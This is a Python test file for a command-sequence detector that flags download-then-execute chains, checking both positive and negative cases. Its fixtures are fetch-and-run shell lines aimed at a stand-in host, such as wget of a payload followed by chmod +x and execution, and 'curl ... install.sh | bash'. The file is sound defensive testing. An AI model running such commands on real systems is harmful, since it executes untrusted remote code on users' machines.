from intelligence.intent.sequence_detector import CommandSequenceDetector


def test_detects_download_chmod_and_execution_chain():
    detector = CommandSequenceDetector()

    result = detector.detect(
        [
            "wget http://example.test/payload",
            "chmod +x payload",
            "./payload",
        ]
    )

    assert result is not None
    assert result.intent == "payload_execution_chain"
    assert result.phase == "execution"
    assert result.confidence == 0.85
    assert result.evidence == [
        "wget http://example.test/payload",
        "chmod +x payload",
        "./payload",
    ]


def test_detects_download_piped_to_shell():
    detector = CommandSequenceDetector()

    result = detector.detect(
        ["curl http://example.test/install.sh | bash"]
    )

    assert result is not None
    assert result.intent == "payload_execution_chain"


def test_does_not_detect_execution_before_download():
    detector = CommandSequenceDetector()

    result = detector.detect(
        [
            "./existing_program",
            "wget http://example.test/payload",
        ]
    )

    assert result is None


def test_download_without_execution_is_not_a_chain():
    detector = CommandSequenceDetector()

    result = detector.detect(
        ["wget http://example.test/payload", "ls"]
    )

    assert result is None


def test_empty_commands_return_no_finding():
    detector = CommandSequenceDetector()

    assert detector.detect([]) is None
    assert detector.detect(None) is None


def test_downloaded_filename_must_match_executed_filename():
    detector = CommandSequenceDetector()

    result = detector.detect(
        [
            "wget http://example.test/payload",
            "./existing_program",
        ]
    )

    assert result is None


def test_matches_explicit_wget_output_filename():
    detector = CommandSequenceDetector()

    result = detector.detect(
        [
            "wget -O /tmp/agent http://example.test/download",
            "chmod +x /tmp/agent",
            "/tmp/agent",
        ]
    )

    assert result is not None
    assert result.evidence == [
        "wget -O /tmp/agent http://example.test/download",
        "chmod +x /tmp/agent",
        "/tmp/agent",
    ]


def test_matches_curl_output_filename():
    detector = CommandSequenceDetector()

    result = detector.detect(
        [
            "curl -o agent http://example.test/download",
            "./agent",
        ]
    )

    assert result is not None
    assert result.evidence == [
        "curl -o agent http://example.test/download",
        "./agent",
    ]


def test_unrelated_chmod_is_not_included_as_evidence():
    detector = CommandSequenceDetector()

    result = detector.detect(
        [
            "wget http://example.test/payload",
            "chmod +x another_file",
            "chmod +x payload",
            "./payload",
        ]
    )

    assert result is not None
    assert "chmod +x another_file" not in result.evidence
    assert "chmod +x payload" in result.evidence
